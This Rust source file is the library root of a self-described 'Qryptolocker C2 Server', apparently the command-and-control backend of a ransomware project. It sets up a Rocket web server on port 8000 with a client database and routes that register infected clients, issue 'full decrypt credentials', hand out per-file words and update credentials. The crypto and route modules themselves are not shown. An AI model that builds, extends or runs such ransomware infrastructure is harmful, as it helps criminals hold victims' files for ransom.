mod crypto;
pub mod routes;
pub mod storage;
pub mod wordlist;

pub use routes::*;
pub use storage::*;
pub use wordlist::*;

use std::sync::Arc;
use tokio::sync::RwLock;

pub type StorageState = Arc<RwLock<ClientStorage>>;

/// Initialize server storage
pub fn init_storage() -> StorageState {
    let storage = match ClientStorage::load_from_disk() {
        Ok(loaded) => {
            println!("📂 Loaded existing client database");
            loaded
        }
        Err(_) => {
            println!("📝 Created new client database");
            ClientStorage::new()
        }
    };
    Arc::new(RwLock::new(storage))
}

/// Build Rocket instance
pub fn build_rocket(storage: StorageState) -> rocket::Rocket<rocket::Build> {
    println!("🔐 Qryptolocker C2 Server");
    println!("📍 http://0.0.0.0:8000");

    rocket::build().manage(storage).mount(
        "/client",
        rocket::routes![
            routes::register_client,
            routes::get_full_decrypt_credentials,
            routes::get_file_word,
            routes::update_credentials,
        ],
    )
}

/// Launch the server (for convenience)
pub async fn launch() -> Result<(), rocket::Error> {
    let storage = init_storage();
    let rocket = build_rocket(storage);
    rocket.launch().await?;
    Ok(())
}
